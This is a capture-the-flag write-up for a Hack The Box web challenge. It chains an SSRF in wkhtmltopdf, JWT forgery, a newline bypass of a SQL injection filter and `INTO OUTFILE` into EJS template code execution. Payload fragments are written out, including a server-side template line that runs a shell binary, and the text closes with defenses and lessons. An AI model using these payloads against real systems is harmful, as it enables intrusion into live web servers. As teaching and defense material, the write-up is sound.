---
title: web/blueprint-heist
platform: HTB
event: try-out
category: web
tags: [ssrf, wkhtmltopdf, jwt-forgery, graphql, sqli, ssti, into-outfile, regex-bypass]
status: solved
difficulty: 5
---

# web/blueprint-heist

**Flag:** `HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_REDACTED}`

**Difficulty:** 🌶️🌶️🌶️🌶️🌶️ (5/5)

**Solve script:** `artifacts/solve.py`, run with `python3 solve.py <target_ip> <target_port>`. Set `JWT_SECRET` to skip the file-read step (see Problems hit).

## Summary

The app is an Express server on port 1337. The `/download` route passes a user-supplied URL to `wkhtmltopdf`, which fetches it from the server and returns a PDF. That is an SSRF. It is enough to read `/app/.env`, which holds the JWT secret, and to reach `127.0.0.1` for the `/admin` and `/graphql` routes.

`/graphql` runs a SQL query built from a string. The SQL filter only checks the first line of the input, so a newline bypasses it. The database user is root with `FILE` privilege, so `INTO OUTFILE` writes an EJS template to `views/errors/404.ejs`. When the app renders a 404, it runs that template, which calls the setuid `/readflag` binary and prints the flag.

Relevant code:

- `src/app/routes/public.js`: `/getToken` issues a guest JWT. `/download` takes a `url` in the body and needs a guest token.
- `src/app/routes/internal.js` and `src/app/schemas/schema.js`: `/admin` and `/graphql` need an admin token. `/graphql` uses `router.all`, so GET works and the request can go through the SSRF.
- `src/app/utils/security.js`: `checkInternal` only accepts `127.0.0.1`. `detectSqli` uses the regex `/^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/`. `.` does not match `\n`, and there is no `m` flag, so only the first line is checked.
- `src/app/schemas/schema.js`: `getDataByName` puts `args.name` into `` `SELECT * FROM users WHERE name like '%${args.name}%'` ``.
- `src/app/controllers/errorController.js`: for an error status from 400 to 599, the app renders `views/errors/<status>.ejs`, and falls back to `error.ejs` if that file is missing. There is no `404.ejs`.
- `src/config/readflag.c` and the Dockerfile: `/readflag` is `chmod 4755` and runs `cat /root/flag.txt`. The `node` user cannot read `/root/flag.txt` directly.
- `src/database/db.sql`: the `root` user has `ALL PRIVILEGES ... WITH GRANT OPTION`.
- `src/flag.txt` is a fake flag. The real flag is at `/root/flag.txt` on the target.

## Attack chain

1. **Guest token.** `GET /getToken` returns a JWT with `role: user`.
2. **Read the secret.** `POST /download` with `url=file:///app/.env` renders the file into a PDF. The text is read from the PDF's ToUnicode map, which gives `secret=`.
3. **Forge an admin token.** Sign `{"role": "admin"}` with HS256 and that secret.
4. **Pass the localhost check.** `POST /download` with `url=http://127.0.0.1:1337/graphql?token=<admin>&query=...`. The request comes from the server, so `checkInternal` passes.
5. **Bypass the SQL filter.** Start the `name` with `\n`. Then `'` and `#` are no longer blocked.
6. **Write the template.** `UNION SELECT 1,0x<hex template>,1,1 INTO OUTFILE '/app/views/errors/404.ejs' #`. The template is `<%- global.process.mainModule.require('child_process').execSync('/readflag').toString() %>`. The hex encoding avoids quotes in the payload.
7. **Trigger the 404.** `GET /<random>` renders `404.ejs`, which runs `/readflag`. The flag is in the response HTML.

Observations from testing:

- **Only the `file://` route fails.** `http://127.0.0.1:1337/` returns a PDF, so the SSRF to loopback is intact. The failure is in local file access, not in the converter.
- **The fake flag in the archive.** `src/flag.txt` contains `HTB{FAKE_FLAG_FOR_TESTING}`. The real flag is only in the instance, and only `/readflag` returns it.

## Steps

1. Run `solve.py`. It reads the secret, forges the admin token, writes `404.ejs`, requests a random path, and prints the first `HTB{...}` found in the response.
2. The flag is printed as `[+] Flag:`. The flag is `HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_REDACTED}`.
3. If the file read is not available, pass the secret directly: `JWT_SECRET='Str0ng_K3y_N0_l3ak_pl3ase?' python3 solve.py <target_ip> <target_port>`.

Running the script again is safe. `INTO OUTFILE` does not overwrite an existing file, so the earlier `404.ejs` is used, and the flag is still printed.

## Problems hit

- **`file://` through `/download` fails on this instance.** A direct `url=file:///app/.env` returns `500` with `Error generating PDF`. `wkhtmltopdf` reports `Fontconfig error: No writable cache directories` and exits with code 1. An `http://127.0.0.1:1337/` request works, so the SSRF itself is intact.
- **The first run failed with `secret not found`.** The response to the `file://` request was the HTML error page, not a PDF. `pdf_text()` found no text, so the regex did not match. The `500` above was the cause.
- **The reading route needs an outside host.** The hint reads files through an iframe. A page hosted on the attacker's server loads `file://`, and `wkhtmltopdf` renders that page. The VPS used for this was no longer reachable, so `solve.py` takes the secret from the `JWT_SECRET` environment variable. The value `Str0ng_K3y_N0_l3ak_pl3ase?` came from an earlier leak of `/app/.env` on this challenge.
- **The leaked secret is still valid on the live target.** A token signed with it returned the "Error Occured" page on `/graphql`. A token signed with a wrong secret returned "Unauthorized". I did not check the response code. The "Error Occured" title probably comes from `checkInternal` rejecting a valid token from a non-localhost address. The script then ran to the flag.
- **The zip's `.env` does not match the live secret.** `src/app/.env` in the archive has `IM_Sup3r_K3y_pl3ase_b3_c4r3ful?`. The live instance uses `Str0ng_K3y_N0_l3ak_pl3ase?`. Use the secret from the instance, not from the source.
- **The PDF text is glyph IDs, not plain text.** `wkhtmltopdf` embeds DejaVuSans and writes the text as CID glyph IDs. `pdf_text()` in `solve.py` reads the `ToUnicode` CMap (`bfrange` and `bfchar`) and turns each `Td` with a vertical move into a newline.

## Defense

- **Restrict what `wkhtmltopdf` can fetch.** Disable `file://` and loopback access, or run the converter in a separate container without access to the app's files or the backend.
- **Do not put the JWT secret in a file the app serves or reads through an SSRF.** Load it from the environment, and rotate it when a leak is possible.
- **Check the whole input.** Validate the complete string, or use parameterised queries. Regex checks on the first line only can be bypassed with a newline.
- **Do not let SQL write files.** Revoke `FILE` and use a least-privilege database user. The app should not run as a DBA.
- **Do not render user-controlled files or routes as templates.** A writable `views/` directory plus `ejs` turns any file write into code execution.

## Lessons

- A proxy or converter that fetches URLs on behalf of users is an SSRF. It can reach loopback, so IP-based access checks do not protect internal routes.
- A filter that checks only the first line of a string misses payloads that start with a newline.
- A database user with `FILE` privilege can turn SQL injection into code execution when the app renders templates from a writable directory.
- When a step needs an outside host, check that the host is still up before you rely on it.
